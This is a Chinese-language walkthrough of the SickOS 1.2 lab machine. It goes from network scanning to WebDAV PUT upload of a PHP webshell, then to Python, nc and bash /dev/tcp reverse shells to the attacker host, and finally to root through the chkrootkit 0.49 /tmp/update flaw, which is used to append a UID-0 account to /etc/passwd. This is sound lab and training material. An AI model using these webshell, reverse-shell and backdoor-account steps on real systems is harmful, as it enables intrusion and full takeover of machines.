# SickOS 1.2

首先我们使用arp-scan -l 发现目标主机。

<pre><code>┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f5:d6:36, IPv4: 192.168.5.134
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.5.1     00:50:56:c0:00:08       VMware, Inc.
192.168.5.2     00:50:56:f6:37:b9       VMware, Inc.
192.168.5.131   00:0c:29:1f:27:fc       VMware, Inc.
<a data-footnote-ref href="#user-content-fn-1">192.168.5.136</a>   00:0c:29:d6:78:03       VMware, Inc.
192.168.5.254   00:50:56:e6:f6:66       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.946 seconds (131.55 hosts/sec). 5 responded                                                                                       
</code></pre>

然后nmap查看一下目标的开放端口

```
┌──(root㉿kali)-[~]
└─# nmap  -sV -sS 192.168.5.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-11 20:16 EST
Nmap scan report for 192.168.5.136
Host is up (0.00042s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28
MAC Address: 00:0C:29:D6:78:03 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.33 seconds
```

80端口似乎是个web页面，访问一下

<figure><img src="../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

没有什么有用的信息，最后一行显示这里什么都没有。我们尝试找下是否存在隐藏目录

```
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://192.168.5.136/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.136/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/test                 (Status: 301) [Size: 0] [--> http://192.168.5.136/test/]
/~sys~                (Status: 403) [Size: 345]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

这里得到了一个/test的目录

<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

我们使用nikto扫描一下，发现这个地址支持OPTIONS, GET, HEAD, POST的请求方法

```
┌──(root㉿kali)-[~]
└─# nikto -host http://192.168.5.136/  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.5.136
+ Target Hostname:    192.168.5.136
+ Target Port:        80
+ Start Time:         2023-12-11 20:55:13 (GMT-5)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ /: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
```

我们尝试使用curl看看/test/这个目录支持的方法

<pre><code>┌──(root㉿kali)-[~]
└─# curl -v -X OPTIONS http://192.168.5.136/test/ 
*   Trying 192.168.5.136:80...
* Connected to 192.168.5.136 (192.168.5.136) port 80
> OPTIONS /test/ HTTP/1.1
> Host: 192.168.5.136
> User-Agent: curl/8.4.0
> Accept: */*
> 
&#x3C; HTTP/1.1 200 OK
&#x3C; DAV: 1,2
&#x3C; MS-Author-Via: DAV
&#x3C; Allow: PROPFIND, DELETE, MKCOL,<a data-footnote-ref href="#user-content-fn-2"> PUT</a>, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
&#x3C; Allow: OPTIONS, GET, HEAD, POST
&#x3C; Content-Length: 0
&#x3C; Date: Tue, 12 Dec 2023 02:05:41 GMT
&#x3C; Server: lighttpd/1.4.28
&#x3C; 
* Connection #0 to host 192.168.5.136 left intact 
</code></pre>

可以看到支持PUT方法，OK那我们可以先在本地创建一个webshell文件

```
┌──(root㉿kali)-[~/Desktop/test]
└─#  echo '<?php passthru($_GET["cmd"]) ?>' > shell.php
```

将创建好的文件使用PUT方法上传到/test/目录

```
┌──(root㉿kali)-[~/Desktop/test]
└─# curl -v -X PUT http://192.168.5.136/test/ -T shell.php
Note: Unnecessary use of -X or --request, PUT is already inferred.
*   Trying 192.168.5.136:80...
* Connected to 192.168.5.136 (192.168.5.136) port 80
> PUT /test/shell.php HTTP/1.1
> Host: 192.168.5.136
> User-Agent: curl/8.4.0
> Accept: */*
> Content-Length: 32
> 
* We are completely uploaded and fine
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Tue, 12 Dec 2023 02:17:33 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 192.168.5.136 left intact
```

我们访问一下/test/这个目录，可以看到文件上传成功

<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

curl执行一下命令

```
┌──(root㉿kali)-[~/Desktop/test]
└─# curl -v "http://192.168.5.136/test/shell.php?cmd=id;whoami;ls+-l" 
*   Trying 192.168.5.136:80...
* Connected to 192.168.5.136 (192.168.5.136) port 80
> GET /test/shell.php?cmd=id;whoami;ls+-l HTTP/1.1
> Host: 192.168.5.136
> User-Agent: curl/8.4.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< X-Powered-By: PHP/5.3.10-1ubuntu3.21
< Content-type: text/html
< Transfer-Encoding: chunked
< Date: Tue, 12 Dec 2023 02:21:21 GMT
< Server: lighttpd/1.4.28
< 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
total 4
-rw-r--r-- 1 www-data www-data 32 Dec 11 18:17 shell.php
* Connection #0 to host 192.168.5.136 left intact
```

在反弹shell的时候它似乎有端口限制，443端口可以反弹shell，我们本地监听443端口，我们这里用python2的payload

```
http://192.168.5.136/test/shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.5.134%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22bash%22%29%27
┌──(root㉿kali)-[~]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.5.134] from (UNKNOWN) [192.168.5.136] 56167
www-data@ubuntu:/var/www/test$
```

{% embed url="https://www.revshells.com/" %}

也可以使用SpyShell这个脚本，相对比较简单，但是这个工具还是得用上nc

```
┌──(root㉿kali)-[~/Desktop/test/SpyShell]
└─# python3 spyshell.py -u http://192.168.5.136/test/shell.php --pretty-prompt
www-data@ubuntu$ 

┌──(root㉿kali)-[~/Desktop/test/SpyShell]
└─# python3 spyshell.py -u http://192.168.5.136/test/shell.php --pretty-prompt
www-data@ubuntu$ rm /tmp/f;mkfifo /tmp/f;bash < /tmp/f | nc 192.168.5.134 443 > /tmp/f

┌──(root㉿kali)-[~]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.5.134] from (UNKNOWN) [192.168.5.136] 56170
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

python -c 'import pty;pty.spawn("/bin/bash")'  #升级shell
www-data@ubuntu:/var/www/test$
```

{% embed url="https://github.com/c0dedeadio/SpyShell" %}

### 权限提升

查看内核版本

```
www-data@ubuntu:/$ cat /proc/version; echo ----; cat /etc/*-release
cat /proc/version; echo ----; cat /etc/*-releasecat /proc/version; echo ----; cat /etc/*-release
Linux version 3.11.0-15-generic (buildd@akateko) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014
----
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04.4 LTS"
NAME="Ubuntu"
VERSION="12.04.4 LTS, Precise Pangolin"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu precise (12.04.4 LTS)"
VERSION_ID="12.04"
```

Ubuntu 12.04.4 运行内核 3.11 32 位架构。searchsploit没有找到相关的提权漏洞。

我们查看一下crontab这个计划任务

```
www-data@ubuntu:/$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

查看cron作业

```
www-data@ubuntu:/etc$ ls -la cron.daily
ls -la cron.daily
total 72
drwxr-xr-x  2 root root  4096 Apr 12  2016 .
drwxr-xr-x 84 root root  4096 Dec 12  2023 ..
-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
```

注意到chkrootkit，是用于检测系统中是否存在已知的 rootkit（恶意软件，通常用于隐藏攻击者的活动）的工具。它是一个用于安全性检查的开源软件，可以帮助管理员识别系统中是否存在潜在的安全威胁。

<pre><code>www-data@ubuntu:/tmp$ chkrootkit -V
chkrootkit -V
<strong>chkrootkit version 0.49
</strong>
┌──(root㉿kali)-[~/Desktop/test/SpyShell]
└─# searchsploit chkrootkit    
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                              | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                      | linux/local/33899.txt
</code></pre>

chkrootkit存在一个本地权限提升的一个漏洞，我们将说明文件复制出来

```
┌──(root㉿kali)-[~/Desktop/test/SpyShell]
└─# searchsploit -m linux/local/33899.txt
  Exploit: Chkrootkit 0.49 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/33899
     Path: /usr/share/exploitdb/exploits/linux/local/33899.txt
    Codes: CVE-2014-0476, OSVDB-107710
 Verified: True
File Type: ASCII text
Copied to: /root/Desktop/test/SpyShell/33899.txt
```

在`/tmp`目录中放置一个可执行文件，命名为'update'，其所有者为非root用户，以具有UID 0的用户（通常是root）身份运行chkrootkit。

```
The line 'file_port=$file_port $i' will execute all files specified in
$SLAPPER_FILES as the user chkrootkit is running (usually root), if
$file_port is empty, because of missing quotation marks around the
variable assignment.

Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
easily take advantage of this
```

为此，我们将附加`/etc/passwd`UID 和 GID 为 0 的行，从而有效地使我们的用户帐户成为第二个`root`帐户。首先，我们需要生成密码哈希。我将使用密码`pwn`：

```
openssl passwd pwn
l1kaPwL6GGupI
```

现在我们将创建update脚本并使其可执行。

非常重要：请确保附加到/etc/passwd操作>>。如果您使用该>操作符，您将完全覆盖该文件并破坏系统！

```
www-data@ubuntu:/var/www/test$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$ echo 'echo ori0n:l1kaPwL6GGupI:0:0:Your local hacker guy:/tmp:/bin/bash >> /etc/passwd' > update
<0:0:Your local hacker guy:/tmp:/bin/bash >> /etc/passwd' > update
www-data@ubuntu:/tmp$ cat update
cat update
echo ori0n:l1kaPwL6GGupI:0:0:Your local hacker guy:/tmp:/bin/bash >> /etc/passwd
www-data@ubuntu:/tmp$ chmod 755 update
chmod 755 update
www-data@ubuntu:/tmp$ tail -n2 /etc/passwd
tail -n2 /etc/passwd
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
ori0n:l1kaPwL6GGupI:0:0:Your local hacker guy:/tmp:/bin/bash
```

ssh登录&#x20;

```
┌──(root㉿kali)-[~/Desktop/test/SpyShell]
└─# ssh ori0n@192.168.5.136
 .oooooo..o  o8o            oooo          .oooooo.                 .o        .oooo.  
d8P'    `Y8  `"'            `888         d8P'  `Y8b              o888      .dP""Y88b 
Y88bo.      oooo   .ooooo.   888  oooo  888      888  .oooo.o     888            ]8P'
 `"Y8888o.  `888  d88' `"Y8  888 .8P'   888      888 d88(  "8     888          .d8P' 
     `"Y88b  888  888        888888.    888      888 `"Y88b.      888        .dP'    
oo     .d8P  888  888   .o8  888 `88b.  `88b    d88' o.  )88b     888  .o. .oP     .o
8""88888P'  o888o `Y8bod8P' o888o o888o  `Y8bood8P'  8""888P'    o888o Y8P 8888888888
                                                                                     
                                                                By @D4rk36
ori0n@192.168.5.136's password: 
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Dec 11 22:59:59 2023 from 192.168.5.134
root@ubuntu:/# cd /root
root@ubuntu:/root# ls
304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz  chkrootkit-0.49
7d03aaa2bf93d80040f3f22ec6ad9d5a.txt                     newRule

```

也可以写入一个shell来反弹

```
www-data@ubuntu:/tmp$ echo "bash -c 'bash -i >& /dev/tcp/192.168.5.134/443 0>&1'" > /tmp/update && chmod +x /tmp/update
<tcp/192.168.5.134/443 0>&1'" > /tmp/update && chmod +x /tmp/update 

┌──(root㉿kali)-[~/Desktop/test/SpyShell]
└─# nc -lnvp 443                                       
listening on [any] 443 ...
connect to [192.168.5.134] from (UNKNOWN) [192.168.5.136] 58527
bash: no job control in this shell
root@ubuntu:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

[^1]: 

[^2]: 
